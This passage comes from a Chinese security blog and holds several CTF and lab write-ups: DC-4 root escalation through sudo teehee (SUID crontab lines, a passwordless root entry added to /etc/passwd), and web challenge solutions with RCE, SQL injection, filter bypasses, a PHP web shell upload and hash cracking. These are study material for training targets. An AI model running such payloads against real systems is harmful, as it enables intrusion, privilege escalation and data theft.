(ECDSA) to the list of known hosts. jim@192.168.43.193&#39;s password: Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 The programs includ... jim@dc-4:~$ ls backups mbox test.sh jim@dc-4:~$ cat mbox From root@dc-4 Sat Apr 06 20:20:04 2019 Return-path: &lt;root@dc-4&gt; Envelope-to: jim@dc-4 Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000 Received: from root by dc-4 with local (Exim 4.89) (envelope-from &lt;root@dc-4&gt;) id 1hCiQe-0000gc-EC for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000 To: jim@dc-4 Subject: Test MIME-Version: 1.0 Content-Type: text/plain; charset=&quot;UTF-8&quot; Content-Transfer-Encoding: 8bit Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt; From: root &lt;root@dc-4&gt; Date: Sat, 06 Apr 2019 20:20:04 +1000 Status: RO This is a test. 切换到/var/mail下获得Charles的密码 jim@dc-4:~$ cd /var/mail jim@dc-4:/var/mail$ ls jim jim@dc-4:/var/mail$ cat jim From charles@dc-4 Sat Apr 06 21:15:46 2019 Return-path: &lt;charles@dc-4&gt; Envelope-to: jim@dc-4 Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000 Received: from charles by dc-4 with local (Exim 4.89) (envelope-from &lt;charles@dc-4&gt;) id 1hCjIX-0000kO-Qt for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000 To: jim@dc-4 Subject: Holidays MIME-Version: 1.0 Content-Type: text/plain; charset=&quot;UTF-8&quot; Content-Transfer-Encoding: 8bit Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt; From: Charles &lt;charles@dc-4&gt; Date: Sat, 06 Apr 2019 21:15:45 +1000 Status: O Hi Jim, I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong. Password is: ^xHhA&amp;hvim0y See ya, Charles 登录charles，尝试命令sudo -l时却提示用teehee提权 jim@dc-4:/var/mail$ su charles Password: charles@dc-4:/var/mail$ sudo -l Matching Defaults entries for charles on dc-4: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User charles may run the following commands on dc-4: (root) NOPASSWD: /usr/bin/teehee 参考别人的文章， 有两种方法： 方法一： ①crontab：是一个计划表，可以定时地执行命令。而需要命令立即执行只要设置为五个*就可以：* * * * * ②teehee：是一个命令，但暂时未弄清楚功能 首先我们进行测试，创建文件666，改变他的权限 # sudo teehee /etc/crontab # * * * * * root chmod 4777 /home/charles/666 charles@dc-4:~$ touch 666 charles@dc-4:~$ ls -la 666 -rw-r--r-- 1 charles charles 0 Sep 23 21:01 666 charles@dc-4:~$ sudo teehee /etc/crontab * * * * * root chmod 4777 /home/charles/666 #此条命令输入一次，回车就可以 * * * * * root chmod 4777 /home/charles/666 ^C charles@dc-4:~$ ls -la 666 -rwsrwxrwx 1 charles charles 0 Sep 23 21:01 666 现在可以去改变/bin/sh的权限 charles@dc-4:~$ ls -la /bin/sh lrwxrwxrwx 1 root root 4 Jan 24 2017 /bin/sh -&gt; dash charles@dc-4:~$ ls -la /bin/dash -rwxrwxrwx 1 root root 124492 Jan 24 2017 /bin/dash charles@dc-4:~$ sudo teehee /etc/crontab * * * * * root chmod 4777 /bin/sh * * * * * root chmod 4777 /bin/sh ^C charles@dc-4:~$ ls -la /bin/dash -rwsrwxrwx 1 root root 124492 Jan 24 2017 /bin/dash 可以看到/bin/dash权限改变成功，接下来直接使用/bin/sh，找flag并读取 charles@dc-4:~$ /bin/sh # find / -name &quot;*flag*&quot; .... /sys/module/scsi_mod/parameters/default_dev_flags /root/flag.txt /proc/sys/kernel/acpi_video_flags /proc/kpageflags # cat /root/flag.txt 888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 &quot;Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88&quot;&quot;88b 888 &quot;88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. &quot; &quot; &quot; &quot; 888P Y888 &quot;Y8888 888 888 8888888P&quot; &quot;Y88P&quot; 888 888 &quot;Y8888 888 888 888 888 Congratulations!!! Hope you enjoyed DC-4. Just wanted to send a big thanks out there to all those who have provided feedback, and who have taken time to complete these little challenges. If you enjoyed this CTF, send me a tweet via @DCAU7. 方法二： teehee -a参数可以不覆盖地向指定文件添加内容，通过这个向passwd中添加一个用户 Ps：查看passwd，root用户的登录shell为/bin/bash charles@dc-4:~$ tail -3 /etc/passwd jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash Debian-exim:x:108:112::/var/spool/exim4:/bin/false charles@dc-4:~$ echo &quot;Knlvre_hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd Knlvre_hack::0:0:::/bin/bash charles@dc-4:~$ tail -3 /etc/passwd sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash Debian-exim:x:108:112::/var/spool/exim4:/bin/false Knlvre_hack::0:0:::/bin/bash 参数解释 #如：admin:x:0:0::/home/admin:/bin/bash #[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell] 添加成功之后，由于没有设置密码，所以直接登录，直接是root权限 charles@dc-4:~$ su Knlvre_hack root@dc-4:/home/charles# id uid=0(root) gid=0(root) groups=0(root) root@dc-4:/home/charles# cat /root/flag.txt 888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 &quot;Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88&quot;&quot;88b 888 &quot;88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. &quot; &quot; &quot; &quot; 888P Y888 &quot;Y8888 888 888 8888888P&quot; &quot;Y88P&quot; 888 888 &quot;Y8888 888 888 888 888 Congratulations!!! Hope you enjoyed DC-4. Just wanted to send a big thanks out there to all those who have provided feedback, and who have taken time to complete these little challenges. If you enjoyed this CTF, send me a tweet via @DCAU7. Reference https://blog.csdn.net/auuuuuuuu/article/details/97832336 https://blog.51cto.com/5437315/2420079 https://www.cnblogs.com/Q--T/p/7864795.html https://www.anquanke.com/post/id/178658 https://blog.csdn.net/Z_Grant/article/details/100866879 https://www.freebuf.com/articles/system/188989.html https://gtfobins.github.io/gtfobins/git/ https://www.cnblogs.com/daxueba-ITdaren/p/10811791.html","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"攻防世界 — Web进阶题(第1-10关)","slug":"攻防世界 — Web进阶题（1-10）","date":"2019-09-04T16:00:00.000Z","updated":"2019-11-06T13:00:44.111Z","comments":true,"path":"2019/09/05/攻防世界 — Web进阶题（1-10）/","link":"","permalink":"https://knlvre.github.io/2019/09/05/攻防世界 — Web进阶题（1-10）/","excerpt":"","text":"Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息 此时想到了命令执行，但是尝试127.0.0.1 &amp; ls、127.0.0.1 &amp;&amp; ls、127.0.0.1 | ls都会显示Invalid URL 网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y，看来是可以传递url编码，系统会接受并进行解析 于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。 url编码表可以参考：http://www.w3school.com.cn/tags/html_ref_urlencode.html 报错信息中可以看到： UnicodeEncodeError at /api/ping 这说明Cloud端使用的是Python的Django框架 看一下官方的文档 所以根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。 我们的目标首先是数据库文件，看从错误信息中能不能拿到flag，可以从配置文件settings.py的报错中看看有没有database的相关信息 ?url=@/opt/api/api/setting.py 搜索关键词database之后，看到两处关键点： os.path.join(BASE_DIR, \\\\\\&amp;#39;database.sqlite3\\\\\\&amp;#39;) &amp;#39;/opt/api/database.sqlite3&amp;#39 现在去访问这个/opt/api/database.sqlite3 ?url=@/opt/api/database.sqlite3 搜索关键词ctf，找到了flag 参考文章：https://blog.csdn.net/zz_Caleb/article/details/95041031 ics-05题目描述： 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 题目进去之后，只有左边栏中的设备维护中心可以点击，进入页面后点击左上角的云平台设备维护中心，就可以在URL中看到提交了page参数 尝试伪协议读取index.php ?page=php://filter/read/convert.base64-encode/resource=index.php base64解码后拿到index.php的源代码，下面给出关键部分 if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) { echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } 可以看到使用了preg_replace()函数，这个函数是有漏洞的： /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码 我们直接上system()函数（记得添加X-Forwarded-For字段） ?pat=/knlvre/e&amp;rep=system(&#39;ls&#39;)&amp;sub=knlvre 直接可以列出当前目录下的详情，我们直接浏览器访问s3chahahaDir目录，在其下面还发现了flag目录，里面有flag.php 还是用前面的伪协议读取就可以了 ?page=php://filter/read/convert.base64-encode/resource=s3chahahaDir/flag/flag.php 解密后得到flag lottery进入该题后，需要先注册一个用户，用户名随意，然后就拥有20块钱。来到Buy页面，输入7个数字，只要猜中数字就能获得对应的报酬（这显然太慢了） 转了几圈没有思路，开始扫目录，发现git源码泄露 GitHack下载源码，查看buy.php，将输入的数字提交到 buy.js &lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;numbers&quot; id=&quot;numbers&quot; minlength=&quot;7&quot; maxlength=&quot;7&quot; pattern=&quot;\\d{7}&quot; required placeholder=&quot;7 numbers&quot;&gt;&lt;button type=&quot;button&quot; id=&quot;btnBuy&quot;&gt;Buy!&lt;/button&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/buy.js&quot;&gt;&lt;/script&gt; 查看buy.js，它将我们提交的numbers又通过POST提交给了 api.php function buy(){ $(&#39;#wait&#39;).show(); $(&#39;#result&#39;).hide(); var input = $(&#39;#numbers&#39;)[0]; if(input.validity.valid){ var numbers = input.value; $.ajax({ method: &quot;POST&quot;, url: &quot;api.php&quot;, dataType: &quot;json&quot;, contentType: &quot;application/json&quot;, data: JSON.stringify({ action: &quot;buy&quot;, numbers: numbers }) }).done(function(resp){ if(resp.status == &#39;ok&#39;){ show_result(resp); } else { alert(resp.msg); } }) } else { alert(&#39;invalid&#39;); } $(&#39;#wait&#39;).hide();} 查看api.php，从代码中可以看出来，“彩票结果”是变量$win_numbers，通过random_num()、random_win_nums()共同生成 switch ($data[&#39;action&#39;]) { case &#39;buy&#39;: require_keys($data, [&#39;numbers&#39;]); buy($data); break;... default: response_error(&#39;invalid request&#39;); break;}function random_num(){ do { $byte = openssl_random_pseudo_bytes(10, $cstrong); $num = ord($byte); } while ($num &gt;= 250); if(!$cstrong){ response_error(&#39;server need be checked, tell admin&#39;); } $num /= 25; return strval(floor($num));}function random_win_nums(){ $result = &#39;&#39;; for($i=0; $i&lt;7; $i++){ $result .= random_num(); } return $result;}function buy($req){ require_registered(); require_min_money(2); $money = $_SESSION[&#39;money&#39;]; $numbers = $req[&#39;numbers&#39;]; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++){ if($numbers[$i] == $win_numbers[$i]){ $same_count++; } } switch ($same_count) { case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; } $money += $prize - 2; $_SESSION[&#39;money&#39;] = $money; response([&#39;status&#39;=&gt;&#39;ok&#39;,&#39;numbers&#39;=&gt;$numbers, &#39;win_numbers&#39;=&gt;$win_numbers, &#39;money&#39;=&gt;$money, &#39;prize&#39;=&gt;$prize]);} 我们可以测试一下，看生成结果的类型：string $numbers（我们要POST的参数）和$win_numbers（系统生成结果）通过弱类型（==）进行比较 查看php官方的类型比较表 刚好我们要POST的格式为JSON，而 JSON 支持布尔类型的参数，payload如下 默认提交的 numbers 字段为字符串，由于我们此处提交的不是字符串，所以要记得修改格式为 [] 不知道为什么，我这里提交 7 个 true 只能得到 1800 。多加几个 true 才能拿到 5000000 {&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true,true,true,true,true]} 有钱之后，买下flag NewsCenter题目描述：如题目环境报错，稍等片刻刷新即可 连接进去之后看到一个搜索框架，第一时间想到：Sql、XSS、XXE ①方法一 现在输入框输入测试数值：123，抓包看一下。首先尝试Sql注入，很快就发现参数单引号包裹，列数为3，没有任何过滤，正常注入就行 [+]注表名：search=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # 返回：news,secret_table [+]注列名：search=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot; # 返回：id,fl4g [+]注数据：search=-1&#39; union select 1,2,fl4g from secret_table # 返回：QCTF{sq1_inJec7ion_ezzz} ②方法二 在网上看到其他大佬的WriteUp，使用Sqlmap来自动完成的，深感工具的魅力，平时都是手动注入，现在将本题利用Sqlmap的过程记录下来 首先还是需要抓取请求，然后将请求复制下来，放进Sqlmap文件夹内的一个txt（本题是模板.txt）里 然后开始用Python2跑Sqlmap，命令及结果如下 python2 sqlmap.py -r 模板.txt --dbs python2 sqlmap.py -r 模板.txt -D news --tables python2 sqlmap.py -r 模板.txt -D news -T secret_table --dump 参考文章：https://blog.csdn.net/yangker12148/article/details/90635554 mfw链接进去之后只有Home、About、Contact可以点击，对应的url传递的page参数也随之改变 没有任何输入点，直接用Github上的工具Dirsearch扫一下，发现了.git文件 python dirsearch.py -u http://111.198.29.45:59852/?page=home -e php 用GitHub上的工具Githack去下载源码 python2 GitHack.py http://111.198.29.45:59852/.git 首先去查看了templates目录，发现里面有flag.php，但是没有有用的东西。只能退后去看index.php，发现了漏洞点 关键代码： &lt;?php if (isset($_GET[&#39;page&#39;])) { $page = $_GET[&#39;page&#39;]; } else { $page = &quot;home&quot;; } $file = &quot;templates/&quot; . $page . &quot;.php&quot;; // I heard &#39;..&#39; is dangerous! assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); // TODO: Make this look nice assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;); ?&gt; assert为断言函数，会将括号内的表达式当做函数去执行，当返回结果为True时，就不会执行die函数。题目直接下载源码无法看到flag，但是flag.php存在必定要利用，所以这里通过assert()函数来执行cat命令，去查看flag.php payload： ?page=what_ever&#39;) or system(&#39;cat templates/flag.php&#39;) // 闭合掉前面的(&#39;就可以，不管前面函数的执行结果，加了or保证让assert()函数执行的结果为True 请求后返回空白，右键查看源代码，就看到了flag 参考文章：https://www.jianshu.com/p/795f918d791b Training-WWW-Robots题目进去之后看到如下提示 In this little training challenge, you are going to learn about the Robots_exclusion_standard.The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.Sometimes these files reveal the directory structure instead protecting the content from being crawled. Enjoy! 访问robots.txt，内容如下 User-agent: * Disallow: /fl0g.php User-agent: Yandex Disallow: * 访问fl0g.php，直接拿到flag bug进入题目，可选动作有login、Register、Findpwd 第一时间想到的是Findwd功能可能会有漏洞，先注册用户 拿着刚注册的用户去重置密码，抓包查看参数。注意到其中有step参数 然后就直接一个提交新密码的框 提交新密码，抓包查看。提交用户名和新密码账号，直接就修改成功 有戏，将用户名换成admin，同样修改成功 用 admin 登录，进入界面，其他按钮都可以点击唯独点击Manage会提示：IP Not allowed，试着添加X-Forwarded-For: 127.0.0.1，进入成功 没有flag，但是有了提示 Where Is The Flag? index.php?module=filemanage&amp;do=??? 尝试了一些常见的系统命令无果，仔细看提示里的filemanage，试一下upload，出现了可以上传的页面 ?module=filemanage&amp;do=upload 上传php提示：It is a php。上传文件后缀名为png，抓包修改为php还是出现同样提示。在文件内容前加上GIF89a还是同样提示 修改后缀名为php5，修改文件内容为 &lt;script language=&#39;php&#39;&gt;system($_GET[&#39;pass&#39;]);&lt;script&gt; 上传成功，拿下flag 所以本题应该是采用 黑名单 + 检测文件内容&lt;?php 的方式 upload进入题目后需要先注册，然后拿着注册的用户去登录，进入到上传页面。刚开始尝试了php、png、gif都提示：Incorrect file extension!，最后发现只有jpg后缀可以上传，上传成功之后，会显示我们上传的所有文件 没有思路，看了别人的WriteUp才知道是文件名注入 我们上传文件，页面将我们上传的文件名返回，应该是查询了数据库。首先验证对参数的拼接，上传三个文件名 s&quot; or 1=1 --+.jpg s&#39; or 1=1 --+.jpg s or 1=1 --+.jpg 其中只有带单引号的没有返回，说明发生了构造，查询结果出乎服务器的预料。确认是单引号之后，就可以开始测试注语句 测试的时候发现，必须要用 加号（+） 连接前后，如下： s’+(要执行的语句)+’ 除了要执行的语句以外，前后两部分是为了闭合单引号，也必须要用 加号 连接，否则语句会出错，导致无法回显内容 s&#39;+(select database())+&#39;.jpg select被过滤掉了，尝试双写绕过成功 s&#39;+(seselectlect database())+&#39;.jpg 但是会发现返回的结果为0，后来发现select database()的结果被系统设置为0 执行常规注入表名的语句返回结果也是0，并且发现from也被过滤 s&#39;+(selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())+&#39;.jpg 怀疑是否对返回的结果进行过滤（即检测为英文字母就过滤掉并返回0），所以尝试将返回结果进行转换 s&#39;+(selselectect hex(database()))+&#39;.jpg 果然将结果处理为十六进制就能返回，将十六进制转换为ASCII，得到web s = &quot;7765625&quot; hex_list = [] con_list = [] ascii_list = [] flag = &quot;&quot; for i in range(0,len(s),2): if(len(s[i:i+2])==2): hex_list.append(s[i:i+2]) for i in hex_list: con_list.append(int(i,16)) for i in con_list: flag = flag + chr(i) print(flag) #输出web 得到数据库名称之后，注表名 s&#39;+(selselectect hex(group_concat(table_name) frfromom information_schema.tables where table_schema=database()))+&#39;.jpg 成功提交后，刷新页面居然没有任何回显，现在开始怀疑是不是将我们转换为十六进制后的字母也过滤掉了 试着将结果在转换为十进制（使用CONV()函数） CONV()函数用法： CONV(要转换的字符串，要转换的进制，转换后的进制) 还是继续拿注数据库的语句进行尝试 s&#39;+(selselectect CONV(hex(database()),16,10))+&#39;.jpg 发现返回一个科学计数法的数字 想了一下，觉得是因为数据库名转换为十六进制对应的是两位两位（比如 web -&gt; 77 65 62），而CONV函数将十六进制整串转化为十进制，那这个数就非常大并且只能用科学技术法标识。想到了一个解决办法：将十六进制的内容分段传给CONV函数能以十进制正常返回的范围，这时候就需要借用到substr()函数，后来尝试最大只能是12位，开始注入： 注数据库 s&#39;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#39;.jpg #返回 131277325825392 果然回显成功 第二部分（返回没有第一次长，应该是结束了） s&#39;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#39;.jpg #返回 1819238756 将两次返回的结果分别转换为ASCII s = [131277325825392,1819238756] for i in range(len(s)): s[i] = hex(s[i])[2:] hex_list = [] con_list = [] flag = &quot;&quot; for i in s: for j in range(0,len(i),2): hex_list.append(i[j:j+2]) for i in hex_list: con_list.append(int(i,16)) for i in con_list: flag = flag + chr(i) print(flag) #输出 web_upload 注表名 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),1,12),16,10))+&#39;.jpg #返回 112602976187180 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),13,12),16,10))+&#39;.jpg #返回 114784820031327 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),25,12),16,10))+&#39;.jpg #返回 112615676665705 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),37,12),16,10))+&#39;.jpg #返回 126853610566245 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),49,12),16,10))+&#39;.jpg #返回 48848364724837 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),61,12),16,10))+&#39;.jpg #返回 29299 转换为 ASCII s = [112602976187180,114784820031327,112615676665705,126853610566245,48848364724837,29299] for i in range(len(s)): s[i] = hex(s[i])[2:] hex_list = [] con_list = [] flag = &quot;&quot; for i in s: for j in range(0,len(i),2): hex_list.append(i[j:j+2]) for i in hex_list: con_list.append(int(i,16)) for i in con_list: flag = flag + chr(i) print(s) print(flag) #输出 files,hello_flag_is_here,members 注列名 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&#39;hello_flag_is_here&#39;)),1,12),16,10))+&#39;.jpg #返回 115858377367398 s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&#39;hello_flag_is_here&#39;)),13,12),16,10))+&#39;.jpg #返回 7102823 使用如上代码，转换为 ASCII 结果为 i_am_flag 注数据 s&#39;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),1,12),16,10))+&#39;.jpg #返回 36427215695199 s&#39;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),13,12),16,10))+&#39;.jpg #返回 92806431727430 s&#39;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),25,12),16,10))+&#39;.jpg #返回 560750951 浏览器结果 转换为 ASCII 结果 拿到flag，直接提交不用加外套 FlatScience进站日常扫描 访问robots.txt，里面的内容也还是我们扫出来的admin.php、login.php 先查看login.php，用户名提交单引号会出现sql报错，但是没有找到突破点。但是在源码中看到&lt;!-- TODO: Remove ?debug-Parameter! --&gt; 提交debug参数，得到源代码 &lt;?php ob_start(); ?&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; blockquote { background: #eeeeee; } h1 { border-bottom: solid black 2px; } h2 { border-bottom: solid black 1px; } .comment { color: darkgreen; } &lt;/style&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align=right class=lastmod&gt; Last Modified: Fri Mar 31:33:7 UTC 1337 &lt;/div&gt; &lt;h1&gt;Login&lt;/h1&gt; Login Page, do not try to hax here plox!&lt;br&gt; &lt;form method=&quot;post&quot;&gt; ID:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt; &lt;br&gt; Password:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;pw&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;?php if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;])){ $user = $_POST[&#39;usr&#39;]; $pass = $_POST[&#39;pw&#39;]; $db = new SQLite3(&#39;../fancy.db&#39;); $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;); if($res){ $row = $res-&gt;fetchArray(); } else{ echo &quot;&lt;br&gt;Some Error occourred!&quot;; } if(isset($row[&#39;id&#39;])){ setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;/&#39;); header(&quot;Location: /&quot;); die(); } } if(isset($_GET[&#39;debug&#39;])) highlight_file(&#39;login.php&#39;); ?&gt; &lt;!-- TODO: Remove ?debug-Parameter! --&gt; 从源码中可以看到：①使用了SQLite3，他是一款轻型的数据库，处理速度比 Mysql、POstfreSQL 都快；②当查询的语句返回结果有值的话，将会调用setcookie()函数 对于 SQLite3 有一点需要知道：它自带的结构表为sqlite_master，sql是其中的一个字段，可以返回创建表的语句，注入的时候经常会用到，首先先搞清楚列数 usr=&#39; union select 1 --+&amp;pw=123 #报错do not have the same number of result columns usr=&#39; union select 1,2 --+&amp;pw=123 #无报错 usr=&#39; union select 1,2,3 --+&amp;pw=123 #报错do not have the same number of result columns 确认字段数为2，并且注入点在2，回显的点在 Set-Cookie 中的name字段，构造 payload 利用 sqlite_master 的 sql 字段可以返回创建表的语句这一功能，查看目标表的字段 usr=&#39; union select name,sql from sqlite_master --+&amp;pw=123 可以看到，服务器返回Set-Cookie字段了，将其解码得到如下 CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) 知道表的列名之后，注出每个字段的数据 id usr=&#39; union select name,group_concat(id) from Users --+&amp;pw=123 name usr=&#39; union select name,group_concat(name) from Users --+&amp;pw=123 password usr=&#39; union select name,group_concat(password) from Users --+&amp;pw=123 hint usr=&#39; union select name,group_concat(hit) from Users --+&amp;pw=123 整理 id name password hint 1 admin 3fab54a50e770d830c0416df817567662a9dc85c my fav word in my fav paper?! 2 fritze 54eae8935c90f467427f05e4ece82cf569f89507 my love isâ¦? 3 Chansi 34b0bb7c304949f9ff2fc101eef0f048be10d3bd the password is password 根据 admin 的 hint ，之前翻网站翻到的 PDF 可能对破解密码有用。用网上的脚本，爬取总共30个 PDF 文件， 然后用脚本进行解析处理，并用sha1函数与加密的密码进行碰撞已找出正确的密码 from cStringIO import StringIO from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter from pdfminer.converter import TextConverter from pdfminer.layout import LAParams from pdfminer.pdfpage import PDFPage import sys import string import os import hashlib def get_pdf(): return [i for i in os.listdir(&quot;./&quot;) if i.endswith(&quot;pdf&quot;)] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec=&#39;utf-8&#39;, laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, &#39;rb&#39;) as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print &quot;Searching word in &quot; + i pdf_text = convert_pdf_2_text(i).split(&quot; &quot;) for word in pdf_text: sha1_password = hashlib.sha1(word+&quot;Salz!&quot;).hexdigest() if sha1_password == &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;: print &quot;Find the password :&quot; + word exit() if __name__ == &quot;__main__&quot;: find_password() 跑出密码：ThinJerboa 到 admin.php 登录，拿下flag web2题目进去就可以看到代码 &lt;?php $miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; function encode($str){ $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; } return str_rot13(strrev(base64_encode($_))); } highlight_file(__FILE__); /* 逆向加密算法，解密$miwen就是flag */ ?&gt; 直接写对应解密代码 &lt;?php $miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; $before_return = base64_decode(strrev(str_rot13($miwen))); $_ = &#39;&#39;; for($_0=0;$_0&lt;strlen($before_return);$_0++){ $_c = substr($before_return,$_0,1); $__ = ord($_c)-1; $_c = chr($__); $_ = $_.$_c; } echo strrev($_); ?&gt; 拿下flag","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"2019XNUCA — ezphp WriteUp","slug":"CTF比赛—2019XNUCA — ezphpWriteUp","date":"2019-09-02T16:00:00.000Z","updated":"2019-11-08T13:10:26.620Z","comments":true,"path":"2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/","link":"","permalink":"https://knlvre.github.io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/","excerpt":"","text":"前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来 ezphp源代码&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file){ if($file !== &quot;index.php&quot;){ unlink($file); } } include_onece(&quot;fl3g.php&quot;); if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])){ highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)){ echo &quot;Hacker&quot;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&quot;/[^a-z\\.]/&quot;,$filename) == 1){ echo &quot;Hacker&quot;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file){ if(is_file($file)){ if($file 